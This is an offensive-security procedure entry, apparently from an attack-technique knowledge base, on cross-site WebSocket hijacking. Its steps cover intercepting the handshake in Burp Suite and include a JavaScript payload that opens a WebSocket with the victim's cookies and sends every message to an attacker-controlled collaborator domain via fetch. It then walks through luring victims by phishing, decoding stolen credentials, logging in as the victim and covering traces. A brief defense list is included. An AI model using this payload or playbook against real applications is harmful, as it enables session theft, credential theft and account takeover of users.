---
id: 52c8110c-5aaf-4bce-ace5-90252bea4155
name: Cross-Site-WebSocket-Hijacking
type: procedure
verified: true
submitted: true
created_at: '2020-08-22T13:07:06.713350+00:00'
updated_at: '2023-05-26T01:10:13.986881+00:00'
platforms:
  - Web
tags:
  - '[[tags/cross-site-websocket-hijacking]]'
  - '[[tags/Web Applications]]'
  - '[[tags/web-sockets]]'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[JavaScript]]'
sub_techniques: []
commands: []
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Cross-Site-WebSocket-Hijacking

## Summary

This procedure exploits WebSocket connections that rely solely on HTTP session cookies without CSRF protection, allowing an attacker to impersonate a victim and perform unauthorized actions, such as exfiltrating chat messages or sensitive data from a live application.

## Description

WebSocket hijacking occurs when an application's WebSocket handshake uses browser cookies for authentication but lacks CSRF tokens or origin validation. An attacker can craft a malicious webpage that initiates a WebSocket connection using the victim's cookies, sending commands to retrieve data (e.g., past chat messages via a 'READY' command) and exfiltrating it to an attacker-controlled server. This technique is effective against real-time applications like chat systems. It requires the victim to visit a malicious page while authenticated to the target site. Success leads to data theft without direct interaction beyond the initial visit. Map to MITRE ATT&CK: [[Steal Web Session Cookie]] (Steal Web Session Cookie) for session hijacking and [[JavaScript]] (JavaScript) for client-side execution.

## Requirements

- Access to Burp Suite Professional for interception and collaborator functionality
- Victim must be authenticated to the target web application with active session cookies
- Attacker-controlled domain for hosting the exploit (e.g., via Burp Collaborator)
- Network access to observe and intercept WebSocket traffic
- Basic knowledge of WebSocket protocols and JavaScript

## Defense

- Implement CSRF tokens in WebSocket handshakes
- Validate Origin and Sec-WebSocket-Key headers strictly
- Use token-based authentication separate from HTTP cookies for WebSockets
- Monitor for anomalous WebSocket connections from unexpected origins
- Enable Web Application Firewall (WAF) rules to detect cross-origin WebSocket initiations

## Objectives

1. Intercept and analyze the target's WebSocket handshake to identify vulnerabilities
2. Craft and deliver a malicious script to exfiltrate data via the hijacked connection
3. Capture and decode exfiltrated data to gain unauthorized access or insights

## Instructions

### Step 1: Observe Application Behavior and Intercept WebSocket Traffic

**Context**: Interact with the target application to trigger WebSocket connections, then use Burp Suite to capture the handshake and message exchanges. This identifies the authentication mechanism and commands like 'READY' for data retrieval.

Configure your browser to proxy traffic through [[tools/Burp-Suite]]. Visit the live chat or real-time feature in the application and perform actions that establish a WebSocket (e.g., loading chat history).

In Burp's Proxy > WebSockets history, locate the connection where the 'READY' command fetches past messages. Right-click the handshake request and send it to Repeater for manipulation.

**Expected Output**: WebSocket frames showing the handshake (e.g., Sec-WebSocket-Key) and initial messages, confirming cookie-based auth without CSRF checks.

### Step 2: Generate Collaborator Payload for Exfiltration

**Context**: Use Burp Collaborator to create a unique domain for receiving exfiltrated data, enabling out-of-band detection of the hijack.

In Burp Suite, navigate to Collaborator > Start Collaborator client (or use the poll feature). Copy the generated collaborator URL to clipboard. This URL will receive HTTP requests containing stolen data.

**Expected Output**: A unique collaborator subdomain (e.g., abc123xyz.oastify.com) ready for polling.

### Step 3: Craft and Host Malicious WebSocket Script

**Context**: Create a JavaScript exploit that mimics the legitimate WebSocket connection but forwards messages to your collaborator server. Deliver this via phishing or a malicious site.

Replace the WebSocket URL in the intercepted handshake with the collaborator-augmented endpoint if needed, but primarily modify the script to connect to the original wss:// URL and exfiltrate via fetch.

Use the following code snippet [[codes/JavaScript-WebSocket-Hijacking-Exfiltration]]:

```javascript
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");
}
function handleReply(event) {
  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```

Host this as an HTML file on an attacker-controlled server and lure the victim to visit it while authenticated to the target.

**Expected Output**: The script loads in the victim's browser, establishes the WebSocket using victim cookies, sends 'READY', and begins exfiltrating messages.

### Step 4: Monitor and Poll for Exfiltrated Data

**Context**: Poll the collaborator server to capture incoming requests containing the victim's data, then decode to extract usable information.

In Burp Collaborator, click 'Poll now' to check for interactions. Review HTTP GET requests to your collaborator URL, which contain base64-encoded or raw chat data.

**Expected Output**: Incoming requests like GET /?eyJjaGF0Ijoic2Vuc2l0aXZlIG1lc3NhZ2UifQ== showing exfiltrated content.

### Step 5: Decode and Utilize Exfiltrated Data

**Context**: Decode the captured data to reveal sensitive information, such as credentials or session tokens, enabling further compromise.

In Burp's Decoder tab, paste the query parameter from the collaborator response and decode (e.g., from URL/Base64).

Use the decoded credentials or data to log in to the application directly.

**Expected Output**: Plaintext data, such as usernames, passwords, or chat logs, allowing account access or impersonation.

### Step 6: Verify Success and Clean Up

**Context**: Confirm the hijack by performing actions in the application with the exfiltrated data and ensure no traces remain.

Log in with obtained credentials and replicate victim actions. Disable collaborator polling after collection.

**Expected Output**: Successful login and access to victim-specific features without additional auth.
